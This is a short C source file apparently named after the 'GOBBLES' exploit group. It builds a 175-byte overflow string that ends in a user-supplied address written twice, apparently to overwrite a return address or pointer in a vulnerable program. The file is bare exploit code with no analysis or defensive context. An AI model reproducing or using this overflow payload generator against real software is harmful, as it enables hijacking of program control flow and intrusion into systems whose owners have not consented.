/* GOBBLES-invite.c */

#include <stdio.h>

int
main(int argc, char **argv)
{
        char heh[175], *store;
        int i;

        if(argc == 1) exit(0);

        sscanf(argv[1], "%p", &store);
        memset(heh, 'x', sizeof(heh));
        *(long *)&heh[166] = (long)store;
        *(long *)&heh[170] = (long)store;
        heh[174] = '\0';

        fprintf(stdout, "%s", heh);
        exit(0);
}